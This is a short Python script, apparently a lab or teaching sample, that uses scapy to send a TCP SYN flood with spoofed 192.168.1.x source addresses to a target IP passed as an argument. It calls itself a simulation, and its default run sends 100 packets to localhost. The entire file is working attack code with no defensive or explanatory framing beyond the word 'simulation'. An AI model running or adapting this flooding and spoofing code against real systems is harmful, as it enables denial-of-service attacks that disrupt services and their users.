import sys
from scapy.all import IP, TCP, send
import time

def simulate_ddos(target_ip, num_packets):
    print(f"Starting SYN Flood simulation against {target_ip}...")
    for i in range(num_packets):
        
        packet = IP(dst=target_ip, src=f"192.168.1.{i%254}") / TCP(dport=80, flags='S')
        send(packet, verbose=0)
        if i % 10 == 0:
            print(f"Sent {i} packets...")
    print("Simulation Complete.")

if __name__ == "__main__":
    
    simulate_ddos("127.0.0.1", 100)
